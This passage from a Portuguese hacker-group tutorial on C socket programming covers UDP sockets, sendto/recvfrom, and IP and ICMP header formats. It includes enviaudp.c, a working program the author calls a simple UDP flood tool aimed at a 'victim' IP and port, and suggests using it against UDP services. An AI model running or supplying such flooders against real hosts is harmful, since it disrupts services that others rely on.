+origem e de destino dentro de uma estacao.
+Em muitas implementacoes, quando um processo negocia com o sistemas
+operacional para utilizar uma dada porta, o sistema operacional cria uma
+fila interna para armazenar as mensagens que chegam.Quando o UDP recebe
+um datagrama, ele verifica se o numero da porta de destino corresponde
+a uma das portas corretamente em uso.Se nao encontrar uma porta, ele
+envia uma mensagem ICMP significando que a porta nao eh atingivel
+(port unreachable) e descarta o datagrama.Se uma porta for encontrada,o
+UDP enfileira o novo datagrama para que o processo correspondente possa
+acessa-lo.Ocorre um erro se a fila associada a essa porta estiver cheia,
+sendo o datagrama descartado pelo UDP.
+A designacao de numeros de portas de protocolo eh uma questao importante
+porque dois computadores precisam estar de acordo sobre o numero da porta
+antes que possam interoperar(Atencao nisso, isso responde algumas questoes
+sobre exploits que necessitam emular um servidor).Por exemplo,quando um
+computador deseja obter um arquivo dentro de outro computador, ele
+precisa conhecer qual eh a porta associada ao programa de transferencia
+de arquivos existente no computador remoto.Ha duas maneiras para designar
+uma porta.A primeira eh utilizar uma autoridade central para designar
+numeros de portas conforme a necessidade e publicar lista de todas as
+portas designadas, sendo entao todos os aplicativos construido de acordo
+com essa lista.
+A segunda maneira para designar portas utiliza ligacao dinamica.Neste caso,
+as portas nao sao globalmente conhecidas.Em vez disso, sempre que um
+programa necessita de uma porta, a rede designa uma.Para ser informado
+sobre a porta designada em outro computador, eh necessario enviar uma
+solicitacao questionando a identificacao da porta associada ao servico
+desejado.A maquina questionada responde indicando o numero correto da porta
+a ser utilizada.
+O TCP adota um meio hibrido para designar alguns numeros de portas a
+"priori"(ver algumas em seu arquivo /etc/services), sendo deixadas muitas
+disponiveis para ambientes locais ou programas de aplicacao.
+
+Boa parte do que foi descrito acima, foi "retirado" do livro "Arquitetura
+de Redes de Computadores", 2a. Edicao, da Makron Books, sao varios os
+autores, se puder obter, obtenha mano, eh um excelente livro, traz 
+muita informacao sobre OSI e TCP/IP, melhor do que gastar dinheiro com
+lixos como "A biblia do linux" ou "A internet e os hackers".
+
+A parte teorica descrita acima eh importante para que voce possa de
+alguma forma visualizar o que acontece quando efetuamos uma conexao
+UDP.Eu estou tentando descrever pormenores, porque mais a frente,
+talvez em outros tutoriais iremos necessitar disso tudo, mas lembre-se,
+isso eh soh o basico, se quer ir mais a fundo, procure mais materiais
+sobre isso, nao quero fazer propaganda de livros, mas ainda ha muita
+falta de textos de niveis na internet.Vamos ver se com a ajuda de todos,
+a coisa melhora.
+
+
+3.2.1 - Criando Sockets UDP em C
+-------------------------------
+
+Comecaremos entao a dar inicio a pratica de escrita de sockets UDP em C,
+para linux.Sockets UDP sao muito parecidos com Sockets TCP, apenas algumas
+particularidades se fazem necessarias, haja visto a teoria descrita acima.
+Voce irah perceber muita similiridade no decorrer deste tutorial.
+
+Para criar um socket,usamos o mesmo esquema decrito para sockets TCP,
+mas ao inves do tipo ser SOCK_STREAM, serah SOCK_DGRAM, que eh o tipo de
+socket que eh usado em conexoes via UDP.
+Vejamos um exemplo:
+
+
+#include        <sys/types.h>
+#include        <sys/socket.h>
+
+main(){
+int Meusocket;
+
+Meusocket = socket(AF_INET,SOCK_DGRAM,0);
+...
+}
+
+Lembrando que AF_INET eh para conexoes via protocolo internet(darpa);
+SOCK_DGRAM eh o tipo do socket que iremos usar,no caso UDP Socks,
+e esse 0, refere-se ao protocolo que usaremos, normalmente eh 0 para IP.
+Consulte seu arquivo /etc/protocols, caso necessite.
+
+3.2.2 - Declarando estruturas
+------------------------------
+
+Nos vimos no tutorial basico sobre TCP SOCKS, que nao eh necessario
+declararmos e definirmos uma estrutura(struct sockaddr_in) para nosso
+host local, a nao ser que tenhamos em mente intuito de servirmos algo
+(como numa backdoor).Uma diferenca entre UDP SOCK e TCP SOCKS, reside
+nesta "necessidade" de declararmos uma estrutura sockaddr para nosso
+host local, mesmo que nao venhamos a fazer papel de servidor.
+Entao saiba logo que necessitamos de duas estruturas, uma para o host
+remoto(aquele que queremos conectar), e outra para o host local(o host
+onde voce se encontra).Em seguida usamos a funcao bind() para unirmos
+nosso socket a estrutura.
+
+Vejamos abaixo, como se declaram essas estruturas(servidor e local).
+
+/* Declarando as Estruturas */
+
+main(){
+..
+struct sockaddr_in servidor;
+struct sockaddr_in cliente;
+
+memset((char *) &servidor, 0, sizeof(servidor));
+servidor.sin_family = AF_INET;
+servidor.sin_addr.s_addr = addr->s_addr;
+servidor.sin_port = htons(porta);
+...
+
+memset((char *) &cliente, 0, sizeof(cliente));
+cliente.sin_family = AF_INET;
+cliente.sin_addr.s_addr = htonl(INADDR_ANY);
+cliente.sin_port = htons(0);
+...
+if (bind(Meusocket, (struct sockaddr *) &cliente, sizeof(cliente)) < 0) {
+    perror("Erro em bind()");
+    exit(-1);
+  }
+...
+}
+
+Bom, amigo, aih estah.A declaracao de uma estrutura sockaddr_in para
+sockets em UDP segue o mesmo esquema para sockets em TCP.Coloquei
+memset aih para zerar a estrutura,mas voce poderia ter colocado bzero()
+mesmo.A funcao bind() tambem possui os mesmos propositos aqui,com sockets
+UDP.
+
+Vejamos entao como ficou nosso esquema ateh agora:
+
+/* Esquema inicial para socket UDP */
+
+/* Headers, veja sempre as man pages de cada funcao */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <arpa/inet.h>
+
+
+main(int argc, char *argv[]){
+int Meusocket;
+struct sockaddr_in cliente;
+struct sockaddr_in servidor;
+int porta = 67; /* Soh para efeito de exemplo!!:) */
+
+/* Aqui nos definimos nosso arquivo socket(file descriptor) */
+
+Meusocket = socket(AF_INET,SOCK_DGRAM,0);
+if(Meusocket < 0){
+fprintf(stderr,"Erro em socket() mano!!\n");
+exit(1);
+}
+
+
+/* Abaixo nos criamos nossa estrutura sockaddr_in para o servidor */
+
+memset((char *) &servidor, 0, sizeof(servidor));
+servidor.sin_family = AF_INET;
+servidor.sin_addr.s_addr = inet_addr("150.149.148.147");
+servidor.sin_port = htons(porta);
+
+/* Abaixo nos criamos nossa estrutura sockaddr_in para o cliente */
+
+memset((char *) &cliente, 0, sizeof(cliente));
+cliente.sin_family = AF_INET;
+cliente.sin_addr.s_addr = INADDR_ANY;
+cliente.sin_port = htons(0);
+
+/* Bindamos(unimos) nosso socket a estrutura do cliente */
+  
+if (bind(Meusocket, (struct sockaddr *)&cliente, sizeof(cliente)) < 0) {
+    fprintf(stderr,"Erro em bind()!!");
+    exit(1);
+}
+......
+/* Fim do Esquema Inicial */
+}
+
+Bem, o que vimos acima eh apenas um esquema inicial, para as coisas
+ficarem bem claras para voce.Sao muitas as semelhancas entre os dois tipos
+de sockets ( UDP e TCP), sao poucas as coisas que mudam,mas significativas,
+como vimos na teoria, existe muita diferenca entre os protocolos.Veremos
+abaixo, como enviar e receber dados via UDP Socks.
+
+
+3.2.3 Envio e Recebimento de Dados
+-----------------------------------
+
+Em UDP Socks temos algumas diferencas consideradas sobre envio e
+recebimento de dados usando funcoes.Irei abordar apenas um metodo de envio
+e recebimento de dados que eh usando as funcoes sendto() e recvfrom().
+Existe um esquema para se usar a funcao connect(),mas nao irei aborda-la
+neste tutorial.As funcoes sendto() e recvfrom() serao uteis para o envio
+de dados usando Raw Sockets que veremos mais abaixo, essas funcoes podem
+ser usadas para o envio de qualquer tipo de socket, aih reside a
+importancia de saber manipular dados atraves delas.Veremos entao como se
+declara e usa estas funcoes.
+
+3.2.3.1 - A funcao sendto()
+----------------------------
+
+Esta funcao eh muito conhecida e de suma importancia.Assim como send(),
+que foi descrita na primeira parte do tutorial, a funcao sendto() eh
+usada para enviar dados(mensagens) para um socket.Sua declaracao segue
+da seguinte forma:
+
+#include <sys/types.h>
+#include <sys/socket.h>
+
+int  sendto(int Meusocket, const void *msg, size_t len, int flags,
+            const struct sockaddr *to, socklen_t tolen);
+
+Onde:
+
+Meusocket -> Eh o nosso arquivo socket(file descriptor).
+
+*msg -> Eh um ponteiro para o buffer que contem as mensagens a serem
+	enviadas.
+
+len -> Tamanho desse buffer descrito acima.
+
+flags -> Sao parametros que devem ser incluidos.Eles podem ser:
+	 
+	 #define   MSG_DONTROUTE  0x4  
+	 
+	Usados para diagnosticos ou roteamento de programas.
+
+*to -> Eh a estrutura definida a qual se quer conectar.Nos nossos exemplos
+       geralmente a definimos como "vitima".
+
+tolen -> Tamanho da estrutura descrita acima.
+
+Como podemos novamente ver, sockets em C possui muitas definicoes de alto
+nivel.De forma bem pratica, esta funcao substitui o uso de write() e
+send(), em outros tipos de sockets.Em IPC, ela tambem eh muito usada.
+Vejamos abaixo um programa para enviar pacotes via sendto().
+
+----------------------------- enviaudp.c ---------------------------------
+
+/* Simples programa para envio de dados usando
+   UDP Socks.Pode-se comportar como um UDP-FLOOD.
+   Desenvolvido por Nash Leon vulgo coracaodeleao para o
+   tutorial de sockets parte II.
+   nashleon@yahoo.com.br
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+#define     ERRO        -1
+#define     MSG         "A Ultima Quimera"
+
+main(int argc, char *argv[]){
+int Meusocket;
+char *alvo;
+struct sockaddr_in vitima;
+struct sockaddr_in hacker;
+int porta, num_pac,i,tamanho;
+if(argc < 4){
+printf("***** Simples Exemplo de UDP-FLOOD by Nash Leon *****\n");
+printf("\nUso: %s <ip_vitima> <porta_vitima> <num_pacotes>\n",argv[0]);
+exit(0);
+}
+alvo = argv[1];
+porta = atoi(argv[2]);
+num_pac = atoi(argv[3]);
+Meusocket = socket(AF_INET,SOCK_DGRAM,17);
+if(Meusocket < 0){
+fprintf(stderr,"Erro no socket mano!!\n");
+exit(ERRO);
+}
+hacker.sin_family = AF_INET;
+hacker.sin_addr.s_addr = htonl(INADDR_ANY);
+hacker.sin_port = htons(0);
+bzero(&(hacker.sin_zero), 8);
+
+if (bind(Meusocket, (struct sockaddr *)&hacker, sizeof(hacker)) < 0) {
+fprintf(stderr,"Erro em bind()!!");
+exit(ERRO);
+}
+vitima.sin_family = AF_INET;
+vitima.sin_addr.s_addr = inet_addr(alvo);
+vitima.sin_port = htons(porta);
+bzero(&(vitima.sin_zero), 8);
+
+tamanho = sizeof(struct sockaddr_in);
+for(i=0;i<num_pac;i++){
+/* Funcao sendto() */
+if(sendto(Meusocket,MSG,sizeof(MSG),0,(struct sockaddr_in *)&vitima,tamanho)== -1){
+fprintf(stderr,"Erro no envio!!\n");
+exit(ERRO);}
+printf(".");
+}
+printf("\nPacotes Enviados com Sucesso!!\n");
+return 0;
+}
+---------------------------------------------------------------------------
+
+Este programa envia dados(MSG) via udp socks pela funcao sendto().Voce pode
+usa-lo como um udp-flooder em portas e servicos UDP(Exemplo: 512, 37, etc).
+Mas devemos nos ater a forma como a funcao sendto eh usada no exemplo
+acima.O Basico desta funcao eh isso aih, na parte de RAW Sockets veremos
+muito o seu uso, de modo que espero que esteja tudo claro ou venha a clarear
+mais abaixo.
+
+
+3.2.3.2 - A funcao recvfrom()
+------------------------------
+
+Esta eh equivalente a funcao read() e recv().Serve para receber dados num
+buffer de um socket,lembrando que recvfrom(), assim como sendto(), pode
+ser usada em qualquer tipo de socket.Sua sintaxe segue abaixo:
+
+int recvfrom(int Meusocket, void  *buf,  size_t len, int flags,
+             struct sockaddr *from, socklen_t *fromlen);
+
+Onde:
+
+Meusocket -> Nosso arquivo socket(file descriptor).
+
+*buf -> Ponteiro para o buffer que receberah as mensagens.
+
+len -> Tamanho desse buffer descrito acima.
+
+flags -> Sao argumentos para a chamada recv.Podem ser:
+	 MSG_OOB -> Para dados oob(out-of-band).
+	 MSG_WAITALL -> Este argumento faz com que seja bloqueada a
+			chegada de dados ateh que q requisicao seja
+			satisfeita.
+	Consulte a man page referente a recvfrom para maiores dados e
+	detalhes sobre esses e outros possiveis flags.
+
+*from -> Ponteiro nao nulo.Refere-se ao endereco de origem da mensagem
+	 que serah recebida.
+
+*fromlen -> Tamanho do buffer associado a from.
+
+Para ilustrar o recebimento de arquivos via UDP Socks e via recvfrom,
+analisaremos o programa abaixo:
+
+-----------------------------recebeudp.c------------------------------
+
+/* Simples Programa de Envio e Recebimento de Dados via UDP Socks.
+   Desenvolvido por Nash Leon vulgo coracaodeleao.
+   nashleon@yahoo.com.br.
+   Este programa faz parte de um Simples Exemplo para o tutorial de
+   Programacao Basica de Sockets em C para Linux - Parte II.
+   http://unsekurity.virtualave.net
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+#define     ERRO        -1
+#define     MSG         "A Ultima Quimera de Novo!!"
+
+main(int argc, char *argv[]){
+
+int Meusocket;
+char *alvo,buf[1024],buf2[1024];
+struct sockaddr_in vitima;
+struct sockaddr_in hacker;
+int porta, num_pac,i,tamanho,n,f,x=0;
+if(argc < 4){
+printf("***** Simples Exemplo de Envio e Recebimento de Pacotes *****\n");
+printf("\nUso: %s <ip_vitima> <porta_vitima> <num_pacotes>\n",argv[0]);
+exit(0);
+}
+alvo = argv[1];
+porta = atoi(argv[2]);
+num_pac = atoi(argv[3]);
+Meusocket = socket(AF_INET,SOCK_DGRAM,17);
+if(Meusocket < 0){
+fprintf(stderr,"Erro no socket mano!!\n");
+exit(ERRO);
+}
+hacker.sin_family = AF_INET;
+hacker.sin_addr.s_addr = htonl(INADDR_ANY);
+hacker.sin_port = htons(0);
+bzero(&(hacker.sin_zero), 8);
+if (bind(Meusocket, (struct sockaddr *)&hacker, sizeof(hacker)) < 0) {
+fprintf(stderr,"Erro em bind()!!");
+exit(ERRO);
+}
+
+vitima.sin_family = AF_INET;
+vitima.sin_addr.s_addr = inet_addr(alvo);
+vitima.sin_port = htons(porta);
+bzero(&(vitima.sin_zero), 8);
+
+tamanho = sizeof(struct sockaddr_in);
+for(i=0;i<num_pac;i++){
+if(sendto(Meusocket,MSG,sizeof(MSG),0,(struct sockaddr_in *)&vitima,tamanho) == -1){
+fprintf(stderr,"Erro no envio!!\n");
+exit(ERRO);  }
+printf(". -> Pacote Enviado\n");
+/* recvfrom() segue abaixo, note o &tamanho */
+f=recvfrom(Meusocket,&buf,sizeof(buf),0,(struct sockaddr_in*)&hacker,&tamanho);if(f == -1)
+if(f == -1)
+{
+fprintf(stderr,"Erro no Recebimento");
+exit(ERRO);
+}
+/* Pegando possivel resposta do servidor */
+for(n = 0; (n < f) && (buf[n] != ' '); n++)
+{
+      buf2[x] = buf[n];
+      x++;
+}
+fprintf(stdout, "Resposta da Vitima:  '%s'\n",buf2);
+fflush (stdout);
+}
+close (Meusocket);
+printf("\nVitima Estah com Raiva!!\n");
+printf("Mas Programa foi Executado com Sucesso!!\n");
+return 0;
+}
+--------------------------------------------------------------------------
+
+Aih estah amigo.Para testar este programa sem problemas, abra o seu inetd,
+e manda pacotes para a porta 37(time) ou 518(ntalk), ou qualquer porta UDP
+que esteja aberta em seu sistema, as respostas nao deverao ser muito claras,
+pois nao se estah negociando pacotes seriamente, isso eh soh p/ ilustrar o
+envio e recebimento de dados via UDP Socks.Como estamos no protocolo UDP,
+se voce for testar esses programas em redes remotas, lembre-se que nao 
+existe nenhuma garantia que seus pacotes irao chegar na rede remota(veja
+item 3.1 que trata do protocolo UDP).
+
+Sobre UDP Socks, paramos por aqui.Mais abaixo, irei descrever coisas
+basicas sobre RAW Socks e um exemplo de envio de dados no protocolo UDP
+via RAW Sockets.Existe muito mais coisas sobre UDP Socks, em breve,
+disponibilizarei mais material sobre isso,espero que tenha dado para
+entender algumas coisas, na parte de links e referencias, eu disponibilizo
+alguns lugares aonde voce pode encontrar mais informacoes sobre UDP Socks.
+
+
+
+
+-------------------------------------
+4. PROTOCOLOS DE REDE(MODELO TCP/IP) |
+-------------------------------------
+
+Veremos aqui o basico de alguns protocolos usados na internet, preste
+atencao ao formato dos datagramas e o significados dos seus campos, isto
+serah essencial para programacao de Sockets Raw.
+
+4.1. IP
+--------
+Abaixo segue teorias basicas sobre o protocolo IP.
+
+4.1.1 - A Camada IP
+--------------------
+
+Uma rede TCP/IP eh constituida por sub-redes interconectadas por elementos
+denominados "gateways".A principio, a natureza das tecnologias de
+comunicacao que sao utilizadas nessas sub-redes nao eh relevante ao escopo
+das atribuicoes da arquitetura TCP/IP. Pelo contrario, eh exatamente por
+oferecer um servico de comunicacao de dados, tendo por premissa a
+integracao de sub-redes de tecnologias diversas, que essa arquitetura tem
+alcancado sucesso no meio academico e comercial.
+O elemento "gateway" eh o principal componente de uma rede TCP/IP.Ele
+possui funcionalidades especificas que sao distintas daquelas normalmente
+atribuidas ao "gateway" em redes OSI.A funcao principal de um gateway
+TCP/IP eh a de realizar o encaminhamento de datagramas IP,sendo
+responsavel pela oferta de todo tipo de conexao entre sub-redes fisicas.
+Assim, sub-redes interconectadas por gateways constituem uma rede unica,
+geralmente denominada internet.
+Os gateways realizam todas as operacoes necessarias ao encaminhamento de
+um datagrama a partir da sub-rede de origem ateh a sub-rede de destino.
+O termo sub-rede designa qualquer rede fisica constituinte de uma rede
+internet (Deve-se observar que,por rede internet, entende-se qualquer
+rede TCP/IP,enquanto os termos Internet(I maiusculo) ou INTERNET referem-se
+ao conjunto de redes TCP/IP interconectadas baseadas na ARPANET,incluindo
+a BITNET, NSFNET,MILNET, entre outras).
+O mecanismo utilizado pelos gateways para o roteamento de datagramas eh
+baseado no enderecamento IP.O gateway analisa o conteudo do datagrama IP,
+em especial o endereco de destino.Este campo contem a identificacao da
+sub-rede-alvo.Se o gateway jah estiver conectado para a sub-rede-alvo,
+a solucao eh imediata.Caso contrario, a partir da identificacao da sub-rede
+eh obtido, mediante processos de mapeamento, o endereco fisico do proximo
+gateway na rota para atingir a sub-rede destino.Vejamos abaixo um esquema
+para clarear mais isso:
+
+
+					-----			-----
+				       |  D1 |		       |  D2 |
+					-----                   -----
+					  |                       |
+	    __________	             _____|____               ____|_____
+ -----	   /          /    -----    /          /    -----    /          /
+|  O  | ---/ Sub-Rede / --| Gab |---/ Sub-Rede /---| Gbc |---/ Sub-Rede /
+ -----     /     A    /    -----    /    B     /    -----    /    C     /
+	   /__________/             /__________/             /__________/          
+
+
+
+Onde podemos dizer:
+
+* Quando a estacao origem "O" envia um datagrama para o destino "D1", o
+  datagrama chega primeiro no gateway "Gab".Este analisa o endereco
+  destino e descobre que D1 se encontra na "Sub-Rede B".Como Gab tambem
+  estah conectado a sub-rede B, o datagrama pode ser entregue diretamente
+  a D1.
+  Obs: Atencao neste esquema, ele poderah ser muito util em usos futuros
+       de sniffers.Breve estaremos disponibilizando material sobre isso.
+
+* Quando o datagrama eh enviado de "O" para "D2", o gateway "Gab" nao tem
+  a possibilidade de fazer a entrega direamente.Ele passa, entao, o data-
+  grama para o gateway "Gbc" que faz a entrega.
+
+
+Espero que isto tenha ficado claro, breve deve estar sendo publicado mais
+material de caracteristicas fucadoras,descrevendo pormenores sobre
+roteamento para o uso de "sniffers".Fique atento a home page do Unsekurity
+Team,mano!!Algumas coisas sobre sniffers jah foram discutidas no WebForum
+do Unsekurity Team, de uma olhada no Forum caso nao tenha visto ainda.
+
+
+4.1.2 - PROTOCOLO IP
+-----------------------
+
+Na camada IP estao presentes as funcoes de transporte dos blocos de dados,
+denominados datagramas, da sub-rede de origem para a sub-rede de destino.
+Os datagramas sao transportados atraves de sub-redes diversas,sob o
+controle dos gateways.Em algumas sub-redes, por limitacoes inerentes a
+tecnologia empregada, o tamanho maximo de um bloco de dados de transmissao
+pode ser inferior ao tamanho do datagrama a ser transmitido.Neste caso,os
+datagramas originais sao fragmentados em datagramas menores pelo gateway.
+Na recepcao ha um mecanismo equivalente que monta o datagrama original a
+partir dos datagramas fragmentados.Estas funcoes sao de responsabilidade
+da camada IP.Outras funcoes relevantes dessa camada sao o mapeamento de
+enderecos IP em enderecos fisicos e vice-versa,alem do roteamento.
+
+4.1.3 - Formato dos Datagramas
+-------------------------------
+
+O formato de um datagrama IP eh apresentado abaixo:
+
+ 0      3  4   7 8   	       15 16
+ ----------------------------------------------------------------------
+|versao  | IHL  | Tipo de servico |        Comprimento Total           |
+ ----------------------------------------------------------------------
+|       Identificacao             |  flags |   Offset de fragmento     |
+ ----------------------------------------------------------------------
+| Tempo de vida |    Protocolo    |        checksum do cabecalho       |
+ ----------------------------------------------------------------------
+|			Endereco de origem			       |
+ ----------------------------------------------------------------------
+|			Endereco de destino			       |
+ ----------------------------------------------------------------------
+|			opcoes				 |   padding   |
+ ----------------------------------------------------------------------
+|			       dados				       |
+ ----------------------------------------------------------------------
+
+Vejamos o que representa cada campo deste daih:
+
++ versao -> Este campo indica a versao do protocolo IP que estah sendo
+	    usada.Ela serve para determinar o formato do cabecalho
+	    internet.Lembrando, atualmente usamos a versao 4, IPv4.
+	    Brevemente estarah sendo implementada o IPv6,veja o link
+	    que disponibilizo no final, caso queira info sobre IPv6.
+
++ IHL -> Este campo representa o comprimento do cabecalho(IHL - Internet
+         Header Lenght). fornece o referido comprimento em numero de
+	 palavras de 32 bits, indicando o inicio do campo de dados.O
+	 valor minimo valido para o comprimento do cabecalho eh de cinco
+	 palavras.
+
++ tipo de servico -> Fornece uma indicacao dos parametros da qualidade de
+		     servico desejada.Estes parametros sao usados como
+		     orientacao na selecao dos servicos de transmissao
+		     de dados das sub-redes.
+
++ comprimento total -> Fornece o comprimento do datagrama, medido em
+		       octetos, incluindo o cabecalho e a parte de dados.
+		       O comprimento maximo de um datagrama eh de 65535
+		       octetos.Datagramas desse tamanho sao impraticaveis
+		       para a grande maioria dos computadores.Na verdade
+		       todos os computadores de uma rede internet devem
+		       estar preparados para aceitar datagramas de 576
+		       octetos.Datagramas superiores a 576 octetos podem
+		       ser enviados quando o emissor tem certeza de que
+		       o destinatario estah apto a aceita-los.
+
++ identificacao -> Eh usado na montagem dos fragmentos de um datagrama.
+		   
+
++ flags -> Este campo serve para o controle de fragmentacao, indicando
+	   se um datagrama pode ou nao ser fragmentado ou se houve ou nao
+	   fragmentacao.
+
++ offset de fragmento -> Este campo serve para indicar o posicionamento
+			 do fragmento dentro do datagrama original.Este
+			 posicionamento eh medido em unidades de 8 
+			 octetos(64 bits).Este campo vale zero em
+			 datagramas nao fragmentados e no primeiro 
+			 fragmento de um datagrama.
+
++ tempo de vida -> Este campo indica o tempo de vida maximo que o
+		   datagrama pode trafegar em uma rede internet, sendo
+		   este campo decrementado em cada gateway.Quando o seu
+		   conteudo chega a zero, o datagrama eh descartado.
+
++ protocolo -> Este campo indica o protocolo usuario do IP, cujo os dados
+	       sao transportados na parte de dados dos datagrama.
+
++ checksum do cabecalho -> Este campo serve para indicar erros ocorridos
+			   durante a transmissao ou na utilizacao do
+			   cabecalho; desta forma, o checksum eh
+			   recalculado e verificado a cada ponto onde o
+			   cabecalho eh processado.
+
++ endereco de origem -> Endereco IP do emissor.
+
++ endereco de destino -> Endereco do receptor.
+
++ opcoes -> Este campo possui tamanho variavel, pode conter nenhuma ou
+	    varias opcoes.O campo eh dividido em duas partes, uma
+	    indicando a classe da opcao e outra, o numero da opcao.
+	    As classes podem ser de controle, de indicacao de erros e de
+	    medicao ou testes.Dentro de cada classe, ha os numeros de
+	    opcao que identificam as funcoes auxiliares disponiveis.
+
++ padding -> Este campo eh usado para garantir que o comprimento do
+	     cabecalho do datagrama seja sempre um multiplo inteiro de
+	     32 bits.
+
+Ainda existem muito mais coisas sobre este protocolo, como convencoes,
+classes e formatos dos enderecos, fragmentacao, etc.Nao irei abordar
+estes assuntos, mas se puder, aprenda-os, amigo!!Muitas teorias fucadoras
+possuem base nos possiveis furos deste protocolo no que tinge a estes
+assuntos.Talvez, na terceira parte deste tutorial de sockets, eu descreva
+mais por menores sobre este protocolo, mas por enquanto o que basta eh
+isso.
+
+
+4.2. ICMP
+-------------
+
+O protocolo Internet de mensagens de controle(ICMP - Internet Control
+Message Protocol), definido no RFC792, eh obrigatorio em implementacoes
+da camada IP.Essencialmente, o ICMP eh um protocolo usado na transferencia
+de mensagens de gateways e estacoes para uma estacao da rede internet.Na
+sua maioria,essas mensagens indicam a ocorrencia de problemas no
+transporte de algum datagrama ou servem a operacoes de controle.O ICMP
+utiliza o IP para o transporte de mensagens,nao oferecendo,portanto, 
+garantia de entrega.O ICMP eh considerado integrante da camada IP apesar
+de, na verdade, utilizar os servicos da camada IP.
+
+As mensagens ICMP sao geradas por gateways na rota de transporte de um
+datagrama ou pela estacao de destino.Quando ocorre algum problema
+previsto pelo ICMP, a mensagem ICMP descrevendo a situacao eh preparada
+e entregue a camada IP,que aciona para a mensagem ICMP o cabecalho IP e a
+envia ao emissor do datagrama com o qual ocorreu o problema.
+
+Vejamos abaixo como segue um encapsulamento de uma mensagem ICMP em um
+datagrama IP.
+
+
+
+				        -------------------------
+				       |         Mensagem ICMP   |
+					-------------------------
+					 .			 .
+					    .			 .
+					       .		 .
+			 -----------------------------------------
+Camada IP		| Cabecalho IP         |     Dados IP     |
+			 -----------------------------------------
+		         .					  |
+			   .					  |
+			     .					  |	
+			       .				  |
+Camada	   -------------------------------------------------------
+Inferior  | Cabecalho do Quadro |      Dados do Quadro            |
+           -------------------------------------------------------
+
+
+Vimos acima como eh encapsulado uma mensagem ICMP num datagrama IP,
+veremos agora abaixo o formato geral de uma mensagem(pacote) ICMP.
+
+ 0	      7 8	      15 16			        31
+ ------------------------------------------------------------------
+|    Tipo      |    codigo      |            checksum		   |
+ ------------------------------------------------------------------
+|			   parametros				   |
+ ------------------------------------------------------------------
+|			  ............				   |
+ ------------------------------------------------------------------
+|			   informacao				   |
+ ------------------------------------------------------------------
+
+
+Onde:
+
+tipo -> Corresponde ao campo que identifica uma mensagem ICMP.
+
+codigo -> Corresponde ao campo que eh usado na especificacao dos
+	  parametros da mensagem.
+
+checksum -> Corresponde ao campo que possui o codigo verificador de
+	    erros, calculado a partir da mensagem ICMP completa.
+
+parametros -> Corresponde ao campo que eh usado na especificacao de 
+	      parametros mais longos que os 8 bits do campo "codigo"
+	      e seu formato e tamanho variam com o tipo de mensagem.
+
+informacao -> Corresponde ao campo que fornece dados adicionais sobre o
+	      problema relatado e tambem varia conforma o tipo de
+	      mensagem.
+
+
+Nos casos em que a mensagem ICMP tratar de um datagrama anteriormente
+enviado, a mensagem tambem transporta o cabecalho completo daquele
+datagrama IP e mais os 64 bits iniciais do seu campo de dados.Desta
+forma, a estacao que o emitiu pode identificar qual eh o protocolo
+de nivel superior envolvido.
+
+O ICMP define 13 mensagens de controle detalhadas a seguir.Em alguns
+casos, eh necessario que a mensagem seja mais bem classificada, 
+utilizando-se para isso o campo "codigo".Abaixo seguem possiveis mensagens
+ICMP que poderao ser enviadas neste campo:
+
+ -----------------------------------------------------------------------
+|    Mensagem       | Tipo | Codigo |    Descricao do Codigo		|
+ -----------------------------------------------------------------------
+| Resposta ao Eco   |  0   |   0    | Codigo nao utilizado		|
+ -----------------------------------------------------------------------
+|  Destinatario     |  3   |   0    | sub-rede inacessivel              |
+|  inacessivel      |      |   1    | estacao inacessivel               | 
+|                   |      |   2    | protocolo inacessivel             |
+|                   |      |   3    | porta inacessivel                 |
+|                   |      |   4    | fragmentacao necessaria e campo   |
+|                   |      |        | "flag" nao setado.                |
+|                   |      |   5    | falha na rota especificada        |
+ -----------------------------------------------------------------------
+| Ajuste de Fonte   |  4   |   0    | codigo nao utilizado              |
+ -----------------------------------------------------------------------
+| Redirecao         |  5   |   0    | redireciona datagrama p/ sub-rede |
+|                   |      |   1    | redireciona datagrama p/ estacao  |
+|                   |      |   2    | redireciona datagrama para tipo   |
+|                   |      |        | de servico e sub-rede.            |
+|                   |      |   3    | redireciona datagrama para tipo   |
+|                   |      |        | de servico e estacao.             |
+ -----------------------------------------------------------------------
+|  Eco              |  8   |   0    | codigo nao utilizado              |
+ -----------------------------------------------------------------------
+| Tempo Excedido    |  11  |   0    | tempo de vida excedido em transito|
+|                   |      |   1    | tempo de remontagem excedido.     |
+ -----------------------------------------------------------------------
+| Problema de       |  12  |   0    | codigo nao utilizado              |
+| Parametro	    |      |        |					|
+ -----------------------------------------------------------------------
+| Marca de Tempo    |  13  |   0    | codigo nao utilizado              |
+ -----------------------------------------------------------------------
+| Resposta a Marca  |  14  |   0    | codigo nao utilizado		|
+| de Tempo	    |      |        |					|
+ -----------------------------------------------------------------------
+| Solicitacao de    |  15  |   0    | codigo nao utilizado		|
+| Informacoes       |      |        |					|
+ -----------------------------------------------------------------------
+| Resposta de       |  16  |   0    | codigo nao utilizado		|
+| Informacoe        |      |        |					|
+ -----------------------------------------------------------------------
+| Solicitacao de    |  17  |   0    | codigo nao utilizado		|
+| Mascara de        |      |        |					|
+|  Endereco	    |      |        |					|
+ -----------------------------------------------------------------------
+| Resposta de       |  18  |   0    | codigo nao utilizado		| 
+| Mascara de        |      |        |					|
+| Endereco          |      |        |					|
+ -----------------------------------------------------------------------
+
+Veremos agora,mais detalhadamente o significado que cada uma destas
+mensagens ICMP acima possuem:
+
+* Eco e Resposta ao Eco -> Sao mensagens usadas para testar se a 
+			   comunicacao entre duas entidades eh possivel.
+			   O destinatario eh obrigado a responder a
+			   mensagem de "Eco" com a mensagem "Resposta ao
+			   Eco"(a conhecida Ecco Replay).
+
+* Ajuste de Fonte -> (Source Quench) Serve como regulador de fluxo de
+		     recepcao.Essa mensagem eh gerada por gateways ou
+		     estacoes quando eles precisam reduzir a taxa de envio
+		     de datagramas do emissor.Ao recebe-la, o emissor deve
+		     reduzir a taxa de emissao de datagramas.O receptor
+		     deve continuar a emissao das mensagens "Ajust de
+ 		     Fonte" ateh que a taxa seja reduzida ao valor
+		     desejado.
+
